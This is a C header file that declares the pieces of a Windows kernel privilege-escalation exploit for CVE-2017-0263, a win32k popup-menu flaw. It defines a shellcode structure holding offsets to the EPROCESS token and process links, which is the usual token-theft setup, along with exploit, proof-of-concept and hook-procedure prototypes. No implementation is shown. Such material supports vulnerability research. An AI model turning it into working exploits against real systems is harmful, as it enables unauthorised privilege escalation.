#pragma once
#include "base.h"

#define MN_ENDMENU 0x1F3

#pragma pack(1)
typedef struct _SHELLCODE {
	DWORD reserved;					// 0x0
	DWORD pid;						// 0x4
	DWORD off_CLS_lpszMenuName;		// 0x8
	DWORD off_THREADINFO_ppi;		// 0xC
	DWORD off_EPROCESS_ActiveLink;	// 0x10
	DWORD off_EPROCESS_Token;		// 0x14
	PVOID tagCLS[0x100];		    // 0x18
	BYTE pfnWinProc[0xBE8];			// 0x418
}SHELLCODE, *PSHELLCODE;

typedef struct _TAGPOPUPMENU
{
	DWORD flags;
	DWORD spwndNotify;
	DWORD spwndPopupMenu;
	DWORD spwndNextPopup;
	DWORD spwndPrevPopup;
	DWORD spmenu;
	DWORD spmenuAlternate;
	DWORD spwndActivePopup;
	DWORD ppopupmenuRoot;
	DWORD ppmDelayedFree;
	DWORD posSelectedItem;
	DWORD psDropped;
	DWORD  dwReserve;
}TAGPOPUPMENU, *PTAGPOPUPMENU;
#pragma pack()

BOOL Init_CVE_2017_0263();
DWORD ShellCode_CVE_2017_0263(HWND hWnd, int code, WPARAM wParam, LPARAM lParam);
void CallNtUserMNDraLeave();
LRESULT WINAPI ShowdowWinProc_CVE_2017_0263(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
VOID CALLBACK WinEventProc_CVE_2017_0263(HWINEVENTHOOK hWinEventHook,
	DWORD         event,
	HWND          hwnd,
	LONG          idObject,
	LONG          idChild,
	DWORD         idEventThread,
	DWORD         dwmsEventTime);
LRESULT CALLBACK WinHookProc_CVE_2017_0263(int code, WPARAM wParam, LPARAM lParam);
DWORD ExploitThread_CVE_2017_0263(LPVOID lpParameter);
BOOL POC_CVE_2017_0263();
BOOL Exploit_CVE_2017_0263();